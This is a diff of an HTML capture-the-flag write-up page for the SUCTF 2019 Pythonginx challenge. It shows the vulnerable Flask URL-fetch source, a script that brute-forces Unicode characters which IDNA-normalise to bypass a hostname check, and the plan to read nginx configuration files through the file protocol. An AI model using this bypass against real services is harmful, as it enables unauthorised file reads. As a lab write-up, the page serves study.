@@ -229,65 +229,64 @@
             <div class="markdown-body">
               <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[SUCTF 2019]Pythonginx<br><img src="https://ftp.bmp.ovh/imgs/2021/03/a959acc0f70a10c6.png" srcset="/img/loading.gif">   </p>
 <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目给了源码：     </p>
-<div class="hljs"><pre><code>        @app.route(&#39;/getUrl&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
-def getUrl():
-    url = request.args.get(&quot;url&quot;)
+<div class="hljs"><pre><code><pre><code class="hljs python"><span class="hljs-meta">        @app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getUrl</span>():</span>
+    url = request.args.get(<span class="hljs-string">&quot;url&quot;</span>)
     host = parse.urlparse(url).hostname
-    if host == &#39;suctf.cc&#39;:
-        return &quot;我扌 your problem? 111&quot;
-    parts = list(urlsplit(url))
-    host = parts[1]
-    if host == &#39;suctf.cc&#39;:
-        return &quot;我扌 your problem? 222 &quot; + host
+    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 111&quot;</span>
+    parts = <span class="hljs-built_in">list</span>(urlsplit(url))
+    host = parts[<span class="hljs-number">1</span>]
+    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 222 &quot;</span> + host
     newhost = []
-    for h in host.split(&#39;.&#39;):
-        newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))
-    parts[1] = &#39;.&#39;.join(newhost)
-    #去掉 url 中的空格
-    finalUrl = urlunsplit(parts).split(&#39; &#39;)[0]
+    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):
+        newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))
+    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.join(newhost)
+    <span class="hljs-comment">#去掉 url 中的空格</span>
+    finalUrl = urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]
     host = parse.urlparse(finalUrl).hostname
-    if host == &#39;suctf.cc&#39;:
-        return urllib.request.urlopen(finalUrl).read()
-    else:
-        return &quot;我扌 your problem? 333&quot;     </code></pre></div>
+    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:
+        <span class="hljs-keyword">return</span> urllib.request.urlopen(finalUrl).read()
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 333&quot;</span></code></pre></div></code></pre>
 <p>前两个if不能等于<code>suctf.cc</code>，第三个if读取文件—-&gt;<code>file</code>协议<br>第三个if要<code>host == &#39;suctf.cc&#39;</code><br>不过第三个前面还有个decode<br>所以对输入的加密即可      </p>
 <p>偷大佬的脚本：       </p>
-<div class="hljs"><pre><code>from urllib.parse import urlparse,urlunsplit,urlsplit
-from urllib import parse
-def get_unicode():
-    for x in range(65536):
-        uni=chr(x)
-        url=&quot;http://suctf.c&#123;&#125;&quot;.format(uni)
-        try:
-            if getUrl(url):
-                print(&quot;str: &quot;+uni+&#39; unicode: \\u&#39;+str(hex(x))[2:])
-        except:
-            pass
+<div class="hljs"><pre><code><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse,urlunsplit,urlsplit
+<span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_unicode</span>():</span>
+    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65536</span>):
+        uni=<span class="hljs-built_in">chr</span>(x)
+        url=<span class="hljs-string">&quot;http://suctf.c&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(uni)
+        <span class="hljs-keyword">try</span>:
+            <span class="hljs-keyword">if</span> getUrl(url):
+                print(<span class="hljs-string">&quot;str: &quot;</span>+uni+<span class="hljs-string">&#x27; unicode: \\u&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(x))[<span class="hljs-number">2</span>:])
+        <span class="hljs-keyword">except</span>:
+            <span class="hljs-keyword">pass</span>
 
 
-def getUrl(url):
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getUrl</span>(<span class="hljs-params">url</span>):</span>
     url = url
     host = parse.urlparse(url).hostname
-    if host == &#39;suctf.cc&#39;:
-        return False
-    parts = list(urlsplit(url))
-    host = parts[1]
-    if host == &#39;suctf.cc&#39;:
-        return False
+    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+    parts = <span class="hljs-built_in">list</span>(urlsplit(url))
+    host = parts[<span class="hljs-number">1</span>]
+    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
     newhost = []
-    for h in host.split(&#39;.&#39;):
-        newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))
-    parts[1] = &#39;.&#39;.join(newhost)
-    finalUrl = urlunsplit(parts).split(&#39; &#39;)[0]
+    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):
+        newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))
+    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.join(newhost)
+    finalUrl = urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]
     host = parse.urlparse(finalUrl).hostname
-    if host == &#39;suctf.cc&#39;:
-        return True
-    else:
-        return False
+    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
 
-if __name__==&quot;__main__&quot;:
-    get_unicode()       
-
+<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:
+    get_unicode()</code></pre></div>
 
 
 
@@ -302,7 +301,7 @@ str: ⅽ unicode: \u217d
 str: Ⓒ unicode: \u24b8
 str: ⓒ unicode: \u24d2
 str: Ｃ unicode: \uff23
-str: ｃ unicode: \uff43</code></pre></div>
+str: ｃ unicode: \uff43</code></pre>
 <p>把最后一个c替换即可<br>题目提示nginx，读取nginx的文件         </p>
 <div class="hljs"><pre><code>配置文件存放目录：/etc/nginx
 主配置文件：/etc/nginx/conf/nginx.conf
